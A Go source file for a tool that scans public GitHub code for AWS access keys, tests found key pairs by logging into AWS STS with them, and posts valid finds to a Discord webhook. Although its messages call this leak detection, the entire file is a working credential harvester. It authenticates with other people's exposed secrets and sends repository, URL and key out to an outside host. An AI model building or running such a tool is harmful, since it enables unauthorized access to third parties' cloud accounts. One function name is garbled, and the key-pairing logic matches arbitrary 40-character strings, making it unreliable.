package pkg

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/service/sts"
	"github.com/google/go-github/github"
	"golang.org/x/oauth2"
)

func WatchNewFilesatchNewFiles(githubToken string) {
	ctx := context.Background()
	ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: githubToken})
	client := github.NewClient(oauth2.NewClient(ctx, ts))

	for {
		log.Println("Watching for new file commits...")
		query := "AKIA filename:.env OR filename:.ini OR filename:.yml OR filename:.yaml OR filename:.json sort:updated"
		opt := &github.SearchOptions{Sort: "updated", Order: "desc"}

		results, _, err := client.Search.Code(ctx, query, opt)
		if err != nil {
			log.Printf("Error searching for new files: %v", err)
		}

		for _, file := range results.CodeResults {
			checkFileContent(ctx, client, &file)
		}
		time.Sleep(1 * time.Minute)
	}
}

func checkFileContent(ctx context.Context, client *github.Client, file *github.CodeResult) {
	content, err := fetchFileContent(ctx, client, file)
	if err != nil {
		log.Printf("❌ Error fetching file content: %v", err)
		return
	}

	awsKeyPairs := extractAWSKeys(content)

	for _, creds := range awsKeyPairs {
		accessKey := creds["access_key"]
		secretKey := creds["secret_key"]

		if validateAWSKeys(accessKey, secretKey) {
			log.Printf("🚨 Valid AWS Key Found! Repo: %s | File: %s", file.Repository.GetFullName(), file.GetHTMLURL())

			sendDiscordAlert(file.Repository.GetFullName(), file.GetHTMLURL(), []string{accessKey})
		}
	}
}

func validateAWSKeys(accessKey, secretKey string) bool {

	cfg, err := config.LoadDefaultConfig(context.TODO(),
		config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(accessKey, secretKey, "")),
	)
	if err != nil {
		log.Printf("Failed to load AWS config for key %s: %v", accessKey, err)
		return false
	}

	stsClient := sts.NewFromConfig(cfg)

	_, err = stsClient.GetCallerIdentity(context.TODO(), &sts.GetCallerIdentityInput{})
	if err != nil {
		log.Printf("Invalid AWS Key: %s", accessKey)
		return false
	}

	log.Printf("✅ Valid AWS Key Found: %s", accessKey)
	return true
}

func fetchFileContent(ctx context.Context, client *github.Client, file *github.CodeResult) (string, error) {
	repo := file.GetRepository()
	owner := repo.GetOwner().GetLogin()
	repoName := repo.GetName()
	filePath := file.GetPath()

	fileContent, _, _, err := client.Repositories.GetContents(ctx, owner, repoName, filePath, nil)
	if err != nil {
		return "", fmt.Errorf("GitHub API error fetching file content: %v", err)
	}

	if fileContent == nil {
		return "", errors.New("file content is nil")
	}

	encoding := fileContent.GetEncoding()

	contentStr, err := fileContent.GetContent()
	if err != nil {
		return "", fmt.Errorf("error retrieving file content: %v", err)
	}

	contentStr = strings.TrimSpace(contentStr)

	if encoding == "" || encoding == "none" {
		log.Printf("ℹ️ Info: Plain text detected in %s/%s/%s", owner, repoName, filePath)
		return contentStr, nil
	}

	if encoding == "base64" {

		decodedContent, err := base64.StdEncoding.DecodeString(contentStr)
		if err != nil {
			log.Printf("⚠️ Warning: Expected base64 encoding but got plain text in %s/%s/%s", owner, repoName, filePath)
			return contentStr, nil
		}
		return string(decodedContent), nil
	}

	return "", fmt.Errorf("unknown encoding type: %s", encoding)
}

func extractAWSKeys(content string) []map[string]string {
	awsKeys := []map[string]string{}

	accessKeyPattern := regexp.MustCompile(`AKIA[0-9A-Z]{16}`)

	secretKeyPattern := regexp.MustCompile(`[a-zA-Z0-9/+]{40}`)

	accessKeys := accessKeyPattern.FindAllString(content, -1)
	secretKeys := secretKeyPattern.FindAllString(content, -1)

	for i := range accessKeys {
		if i < len(secretKeys) {
			awsKeys = append(awsKeys, map[string]string{
				"access_key": accessKeys[i],
				"secret_key": secretKeys[i],
			})
		}
	}

	return awsKeys
}

func sendDiscordAlert(repo, url string, keys []string) {
	webhookURL := os.Getenv("DISCORD_WEBHOOK")
	message := map[string]string{
		"content": fmt.Sprintf("🚨 AWS Key Leak Detected!\nRepo: %s\nURL: %s\nKeys: %v", repo, url, keys),
	}
	jsonData, _ := json.Marshal(message)

	req, _ := http.NewRequest("POST", webhookURL, bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending alert to Discord: %v", err)
		return
	}
	defer resp.Body.Close()

	log.Println("🚨 Alert sent to Discord successfully!")
}
